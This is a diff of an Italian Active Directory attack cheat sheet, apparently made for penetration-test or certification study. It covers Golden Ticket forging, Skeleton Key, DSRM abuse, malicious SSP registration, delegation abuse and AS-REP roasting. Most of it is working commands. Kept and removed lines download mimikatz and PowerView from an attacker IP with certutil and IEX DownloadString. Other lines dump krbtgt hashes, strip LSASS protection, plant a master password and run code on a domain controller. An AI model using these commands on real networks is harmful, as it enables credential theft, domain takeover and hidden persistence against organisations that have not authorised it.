@@ -76,8 +76,6 @@ Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( 
 ```
 
 # BloodHound
-### BloodHound è un'applicazione web Javascript a pagina singola con un database Neo4j alimentato da un raccoglitore di dati C#. BloodHound utilizza la teoria dei grafi per rivelare le relazioni nascoste e spesso indesiderate all'interno di un ambiente Active Directory o Azure. Gli aggressori possono utilizzare BloodHound per identificare facilmente percorsi di attacco altamente complessi che altrimenti sarebbero impossibili da identificare rapidamente. 
-### I difensori possono utilizzare BloodHound per identificare ed eliminare gli stessi percorsi di attacco. Sia i team blu che quelli rossi possono utilizzare BloodHound per acquisire facilmente una comprensione più approfondita delle relazioni di privilegio in un ambiente Active Directory o Azure.
 
 ```
 https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
@@ -316,29 +314,16 @@ Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt
 ### Ad esempio, potremmo creare un TGT in cui si afferma che un utente senza privilegi è in realtà un membro del gruppo Domain Admins e il controller di dominio lo considererà attendibile poiché è crittografato correttamente.
 ## Prerequisito: In questa fase del coinvolgimento, dovremmo avere accesso a un account che è un membro del gruppo Domain Admins oppure aver compromesso il controller di dominio stesso.  
 
-- Ottenere hash krbtgt 
-```
-powershell -ep bypass
-
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dc-corp
-```
-o
+- Ottenere hash krbtgt
+  
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 
 mimikatz.exe '"lsadump::lsa /patch"' -Computername dc-corp
 ```
+
 - Usare HASH krbtgt per creare un Golden ticket per un user non autenticato . Si può usare /ticket invece che /ptt per salvare il ticket
-```
-powershell -ep bypass
 
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"kerberos::golden" "/domain:$DOMAIN" "/sid:$DOMAIN_SID" "/krbtgt:$NTLM_HASH" "id:500" "groups:512" "/user:fakeuser" "/ptt"'
-```
-o
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 
@@ -392,14 +377,6 @@ powercat -l -v -t 1000 -p 2023
 ## Skeleton Key [Domain Admins]
 ### Questo attacco si impianta in LSASS e crea una password principale che funzionerà per qualsiasi account Active Directory nel dominio. Poiché anche le attuali password degli utenti continuano a funzionare, un attacco Skeleton Key non interromperà il processo di autenticazione, quindi gli attacchi sono difficili da individuare a meno che tu non sappia cosa cercare. Il riavvio del DC rimuoverà questo attacco. Si potrà accedere a qualsiasi pc con username valido e password che di default sarà mimikatz
 ## Prerequisiti: Essere un utente del gurppo Domain Admins
-```
-powershell -ep bypass
-
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName FQDN
-```
-o
 
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
@@ -412,15 +389,6 @@ Enter-PSSession -Computername DC -credential Domain\Administrator
 ### Se LSASS sta runnando come processo protetto si può usare ancora questa tecnica, tuttavia avrà bisogno del driver mimikatz(mimidriv.sys) sul disco del DC target
 
 ```
-powershell -ep bypass
-
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "misc::skeleton" "!-"' -ComputerName FQDN
-```
-o
-
-```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 
 mimikatz.exe '"privilege::debug" "!+" "!processprotect /process:lsass.exe /remove" "/target: FQDN_DC" "misc::skeleton" "!-"'
@@ -431,26 +399,6 @@ Enter-PSSession -Computername DC -credential Domain\Administrator
 ## DSRM (Directory Services Restore Mode) [Domain Admins]
 ### C'è un local administrator su ogni DC chiamato Administrator la cui password è DSRM password. Tale password è richiesta quando un server è promosso a DC e viene cambiata raramente. Quindi è possibile usare NTLM hash di questo user per accedere a DC.
 
-```
-powershell -ep bypass
-
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dc-host-name
-
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName dc-host-name (comparazione Admin hash con admin hash di questo comando. Il primo è quello DSRM)
-
-Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior (verifichi se c'è il valore)
-
-New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" (se valore non esiste)
-
-Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2" (valore già esiste e lo cambi)
-
-Invoke-Mimikatz -Command  '"sekurlsa::pth" "/domain:dc-host-name" "/user:Administrator" "/ntlm:HASH_DSRM" "/run:powershell.exe"'
-
-ls \\dc-host-name\C$
-```
-o
 ```
 certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
 
@@ -472,28 +420,7 @@ ls \\dc-host-name\C$
 ## Custom SSP (Security Support Provider) [Local Admin nella macchina]
 ### La SSP è una DLL la quale fornisce una via per un applicazione di ottenere una comunicazione autenticata. Alcune SSP di Microsoft sono NTLM,Kerberos,WDigest. L'SSPI si occuperà di trovare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito è Kerberos. Questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL ed entrambi i computer devono supportarli per poter comunicare. Mimikatz fornisce una SSP personalizzata chiamata (mimilib.dll). Questo SSP registra i logon locali, account di servizio e le password degli account macchina in testo chiaro sul server di destinazione.
 ## Prerequisiti: Local Admin nella macchina
-```
-Drop the mimilib.dll to system32 and add mimilib to
 
-$packages Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' select -ExpandProperty 'Security Packages'
-
-$packages += "mimilib"
-
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
-
-Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
-
-Using Invoke-Mimikatz
-
-powershell -ep bypass
-
-Import-Module Invoke-Mimikatz.ps1
-
-Invoke-Mimikatz -Command '"misc::memssp"'
-
-Tutte le info recuperate sono su C:\Windows\system32\kiwissp.log	
-```
-o
 ```
 Drop the mimilib.dll to system32 and add mimilib to
 
@@ -588,12 +515,6 @@ Get-RemoteCachedCredential -Computername <computername> -Verbose (Retrieve domai
 ## Differenza tra Contrained Delegation Uncontrained Delegation e Resource Based Constrained Delegation - RBCD
 <img src="UC_C.png" width="800">
 
-### Delega vincolata basata sulle risorse (RBCD). Introdotta con Windows Server 2012, questa soluzione permette di superare alcune problematiche legate alla Delega Vincolata (Responsabilità, delega interdomini,…). Senza entrare troppo nei dettagli, si sposta la responsabilità della delega. Mentre nella delega vincolata è il server di inoltro che contiene l'elenco dei servizi di destinazione consentiti, nel caso della delega vincolata basata sulle risorse sono le risorse (o i servizi) che dispongono di un elenco di account di cui si fidano per la delega.
-<img src="RBCD1.png" width="800">
-
-### Uncontrained delegation: il server o l'account del servizio a cui viene concesso questo diritto è in grado di impersonare un utente per autenticarsi su qualsiasi servizio su qualsiasi host .
-### Constrained delegation: Se un computer o un account di servizio ha il flag di Delega Vincolata impostato, a questo flag sarà associato un elenco di servizi autorizzati. Ad esempio, nell'esempio precedente (server Web e file server), il server Web avrà il flag di delega vincolata che indica che questo account può rappresentare solo alcuni utenti rispetto al CIFSservizio ospitato da SERVER01, il file server.
-
 ## Contrained Delegation [Local Admin sulla macchina con la delegazione attiva]
 <img src="CD1.png" width="800">
 
@@ -645,6 +566,10 @@ Invoke-Mimikatz -Command '"kerberos:ptt [ticket.kirbi]'"
 Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc (RCE su Domain Controller)
 ```
 
+## Delega vincolata basata sulle risorse (RBCD).
+<img src="RBCD1.png" width="800">
+
+
 ## Abuse SQL [Local Admin on machine]
 ### I server MS SQL sono generalmente distribuiti in abbondanza in un dominio Windows.
 ### I server SQL offrono ottime possibilità di spostamento laterale, in quanto gli utenti del dominio possono essere mappati su ruoli di database.
@@ -664,9 +589,6 @@ Get-SQLServerLinkCrawl -Instance dbserver31.TECH.FINANCE.CORP -Query 'exec maste
 ### Se nelle impostazioni UserAccountControl di un utente è abilitata la funzione "Non richiedere la preautenticazione Kerberos", ossia la preautenticazione Kerberos è disabilitata, è possibile ottenere l'AS REP decifrabile dell'utente e forzarlo offline. In pratica richiedi un Ticket Granting Ticket (TGT). Il KDC risponderà con il TGT per l'account, senza richiedere la password dell'account come pre-autenticazione.
 
 ```
-powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -PreauthNotRequired -Verbose" 
-
-o
 Invoke-ASREPRoast -Verbose (enumerazione di tutti gli utenti cpn Kerberos pre auth disabilitato)
 
 Get-ASREPHash -Username student1 -Verbose (prendere hash) 
